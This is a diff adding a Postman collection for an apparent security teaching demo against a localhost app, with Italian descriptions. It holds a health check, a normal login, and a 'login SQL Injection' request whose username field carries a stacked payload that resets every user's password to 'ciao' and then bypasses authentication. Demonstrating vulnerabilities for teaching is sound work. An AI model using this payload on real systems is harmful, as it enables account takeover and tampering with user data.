@@ -1,0 +1,154 @@
+{
+	"info": {
+		"_postman_id": "ce2d5046-0984-4505-b6ba-96be004b6819",
+		"name": "Design Pattern for Security Demo",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "21190233"
+	},
+	"item": [
+		{
+			"name": "health",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"pm.test(\"Status code is 200\", function () {",
+							"    pm.response.to.have.status(200);",
+							"});"
+						],
+						"type": "text/javascript",
+						"packages": {}
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{base_url}}/health",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"health"
+					]
+				},
+				"description": "Questa è una classica richiesta GET che permette di verificare se il server è in funzione.\n\nUna richiesta che va a buon fine tipicamente ritorna 200 OK e il testo \"UP\"."
+			},
+			"response": []
+		},
+		{
+			"name": "login SQL Injection",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"pm.test(\"Successful POST request\", function () {",
+							"    pm.expect(pm.response.code).to.be.oneOf([200, 201]);",
+							"});",
+							""
+						],
+						"type": "text/javascript",
+						"packages": {}
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "username",
+							"value": "bho' OR '1'='1'; UPDATE users SET password = 'ciao' WHERE username = 'bho' or '1'='1",
+							"type": "text"
+						},
+						{
+							"key": "password",
+							"value": "ciao",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "{{base_url}}/auth/login",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"auth",
+						"login"
+					]
+				},
+				"description": "Questa è un richiesta POST che permette di effettuare SQL injection, grazie al body specificato sotto.\n\nLa prima richiesta fallirà ma cambierà tutte le password del DB degli utenti al valore \"ciao\". La seconda richiesta infine riuscirà a passare la fase di autenticazione, senza conoscere nessun nome utente e nemmeno nessuna password. L'unico prerequisito è la conoscenza del nome della tabella degli utenti che però è facilmente ricavabile.\n\nUna richiesta che va a buon fine tipicamente ritorna 200 OK e nel body della risposta il file JSON con i dati(tranne quelli sensibili) dell'utente autenticato."
+			},
+			"response": []
+		},
+		{
+			"name": "login normal",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "username",
+							"value": "mario.rossi",
+							"type": "text"
+						},
+						{
+							"key": "password",
+							"value": "password",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "{{base_url}}/auth/login",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"auth",
+						"login"
+					]
+				},
+				"description": "Questa è un richiesta POST che permette di effettuare un normale login.\n\nUna richiesta che va a buon fine tipicamente ritorna 200 OK e nel body della risposta il file JSON con i dati(tranne quelli sensibili) dell'utente autenticato."
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "base_url",
+			"value": "http://localhost:8080"
+		}
+	]
+}
